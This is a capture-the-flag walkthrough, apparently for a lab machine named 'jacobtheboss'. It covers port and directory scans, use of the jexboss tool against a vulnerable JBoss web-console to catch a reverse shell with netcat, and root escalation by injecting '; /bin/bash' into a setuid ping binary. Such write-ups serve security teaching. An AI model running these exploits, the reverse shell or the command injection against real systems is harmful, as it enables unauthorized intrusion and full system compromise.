Quick port scan.

```bash
nmap -p- --min-rate=5000 10.82.132.242    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 09:18 EST
Nmap scan report for jacobtheboss.box (10.82.132.242)
Host is up (0.17s latency).
Not shown: 65515 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
1090/tcp  open  ff-fms
1098/tcp  open  rmiactivation
1099/tcp  open  rmiregistry
3306/tcp  open  mysql
3873/tcp  open  fagordnc
4444/tcp  open  krb524
4445/tcp  open  upnotifyp
4446/tcp  open  n1-fwp
4457/tcp  open  prRegister
4712/tcp  open  unknown
4713/tcp  open  pulseaudio
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
8083/tcp  open  us-srv
32208/tcp open  unknown
40104/tcp open  unknown
41933/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
```

I went to the website and did a directory scan.

```bash
ffuf -u http://jacobtheboss.box/FUZZ -w /usr/share/dirb/wordlists/big.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jacobtheboss.box/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 3733ms]
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 4784ms]
LICENSE                 [Status: 200, Size: 17987, Words: 3013, Lines: 340, Duration: 205ms]
admin                   [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 111ms]
cache                   [Status: 403, Size: 207, Words: 15, Lines: 9, Duration: 101ms]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9, Duration: 88ms]
db                      [Status: 403, Size: 204, Words: 15, Lines: 9, Duration: 91ms]
inc                     [Status: 403, Size: 205, Words: 15, Lines: 9, Duration: 71ms]
locales                 [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 72ms]
plugins                 [Status: 403, Size: 209, Words: 15, Lines: 9, Duration: 82ms]
public                  [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 69ms]
themes                  [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 75ms]
var                     [Status: 403, Size: 205, Words: 15, Lines: 9, Duration: 382ms]
```

I was kinda lost so I just did a more specific scan.

```bash
nmap -p- --min-rate=5000 -sC -sV 10.82.132.242                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 11:31 EST
Warning: 10.82.132.242 giving up on port because retransmission cap hit (10).
Nmap scan report for jacobtheboss.box (10.82.132.242)
Host is up (0.072s latency).
Not shown: 63416 closed tcp ports (reset), 2099 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp    open  http         Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-title: My first blog
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
111/tcp   open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp  open  java-rmi     Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp  open  java-rmi     Java RMI
1099/tcp  open  java-object  Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
3873/tcp  open  java-object  Java Object Serialization
4444/tcp  open  java-rmi     Java RMI
4445/tcp  open  java-object  Java Object Serialization
4446/tcp  open  java-object  Java Object Serialization
4457/tcp  open  tandem-print Sharp printer tandem printing
4712/tcp  open  msdtc        Microsoft Distributed Transaction Coordinator (error)
4713/tcp  open  pulseaudio?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    9ca8
8009/tcp  open  ajp13        Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to JBoss&trade;
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: Apache-Coyote/1.1
8083/tcp  open  http         JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
32208/tcp open  unknown
40104/tcp open  unknown
41933/tcp open  java-rmi     Java RMI
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.95%I=7%D=12/7%Time=6935ABF3%P=x86_64-pc-linux-gnu%r(NU
SF:LL,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97
SF:\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByt
SF:esq\0~\0\x01xp\xf1\x91\xd1Qur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02
SF:\0\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~\0
SF:\0q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server\.
SF:NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.R
SF:emoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server
SF:\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\0\
SF:x10jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0\xf8\xfdI\xbd\0\0\x01\x9a\
SF:xf9%\x10\xd8\x80\0\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3873-TCP:V=7.95%I=7%D=12/7%Time=6935ABF7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4445-TCP:V=7.95%I=7%D=12/7%Time=6935ABF7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.95%I=7%D=12/7%Time=6935ABF7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.95%I=7%D=12/7%Time=6935ABF7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,5,"9ca8\n")%r(GenericLines,5,"9ca8\n")%r(GetRequest,5,"9ca8\n")%r(HT
SF:TPOptions,5,"9ca8\n")%r(RTSPRequest,5,"9ca8\n")%r(RPCCheck,5,"9ca8\n")%
SF:r(DNSVersionBindReqTCP,5,"9ca8\n")%r(DNSStatusRequestTCP,5,"9ca8\n")%r(
SF:Help,5,"9ca8\n")%r(SSLSessionReq,5,"9ca8\n")%r(TerminalServerCookie,5,"
SF:9ca8\n")%r(TLSSessionReq,5,"9ca8\n")%r(Kerberos,5,"9ca8\n")%r(SMBProgNe
SF:g,5,"9ca8\n")%r(X11Probe,5,"9ca8\n")%r(FourOhFourRequest,5,"9ca8\n")%r(
SF:LPDString,5,"9ca8\n")%r(LDAPSearchReq,5,"9ca8\n")%r(LDAPBindReq,5,"9ca8
SF:\n")%r(SIPOptions,5,"9ca8\n")%r(LANDesk-RC,5,"9ca8\n")%r(TerminalServer
SF:,5,"9ca8\n")%r(NCP,5,"9ca8\n")%r(NotesRPC,5,"9ca8\n")%r(JavaRMI,5,"9ca8
SF:\n")%r(WMSRequest,5,"9ca8\n")%r(oracle-tns,5,"9ca8\n")%r(ms-sql-s,5,"9c
SF:a8\n")%r(afp,5,"9ca8\n")%r(giop,5,"9ca8\n");
Service Info: OS: Windows; Device: printer; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 243.27 seconds
```

Ok so some important ones are sql, website on 80 and 8080(jboss)

I decided to look for CVE's on the JBOSS site

U found a site that explains some stuff about it. Certain paths reveal server details. I could do it manually but decided to use msfconsole module since it obviously autotmates the process....

https://github.com/joaomatosf/jexboss

```bash

 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * | 
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://jacobtheboss.box:8080 **

 [*] Checking admin-console:                  [ OK ]
 [*] Checking Struts2:                        [ OK ]
 [*] Checking Servlet Deserialization:        [ OK ]
 [*] Checking Application Deserialization:    [ OK ]
 [*] Checking Jenkins:                        [ OK ]
 [*] Checking web-console:                    [ VULNERABLE ]
 [*] Checking jmx-console:                    [ VULNERABLE ]
 [*] Checking JMXInvokerServlet:              [ VULNERABLE ]


 * Do you want to try to run an automated exploitation via "web-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://jacobtheboss.box:8080. Please wait...

 * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.
   OBS: You can also use the --cmd "command" to send specific commands to run on the server.
   IP Address (RHOST):
```

Then i just setup netcat and then we got a shell. It was because the web-console was vulnerable.

```bash

┌──(kali㉿kali)-[~/temp/jexboss]
└─$ nc -lvnp 4444  
listening on [any] 4444 ...
connect to [192.168.190.157] from (UNKNOWN) [10.82.132.242] 38350
bash: no job control in this shell
[jacob@jacobtheboss /]$

```

Now ill import linpeas over to find out if we have the password for the user jacob

We didn't find any credentials in there.

```bash

[jacob@jacobtheboss ~]$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper

```

I decided to look up things that have the permissions set in a way that they always run as the owner of the file. So mostly root. Now we lets check if we use this to privEsc

I found this https://security.stackexchange.com/questions/196577/privilege-escalation-c-functions-setuid0-with-system-not-working-in-linux

Basically since the ping command runs as root we can escape the command and use it to create a shell.. 

```bash
[jacob@jacobtheboss bin]$ ./pingsys '127.0.0.1; /bin/bash'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.022 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.022 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.023 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.013/0.020/0.023/0.004 ms
[root@jacobtheboss bin]# 
```

Root'd




